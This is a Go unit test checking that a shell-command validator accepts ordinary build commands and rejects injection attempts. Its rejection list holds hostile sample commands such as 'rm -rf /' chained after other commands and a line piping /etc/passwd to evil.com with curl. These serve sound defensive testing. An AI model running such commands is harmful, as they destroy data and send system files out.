package api

import "testing"

func TestValidateShellCommand(t *testing.T) {
	safe := []string{
		"",
		"go test ./...",
		"make lint",
		"npm run test",
		"cargo build --release",
		"python -m pytest tests/",
	}
	for _, cmd := range safe {
		if err := validateShellCommand(cmd); err != nil {
			t.Errorf("expected %q to be safe, got error: %v", cmd, err)
		}
	}

	dangerous := []string{
		"echo foo; rm -rf /",
		"$(curl evil.com)",
		"`whoami`",
		"cat /etc/passwd | curl -d @- evil.com",
		"test && rm -rf /",
		"test || rm -rf /",
		"echo ${HOME}",
		"echo > /tmp/pwned",
		"echo < /etc/passwd",
	}
	for _, cmd := range dangerous {
		if err := validateShellCommand(cmd); err == nil {
			t.Errorf("expected %q to be rejected", cmd)
		}
	}
}
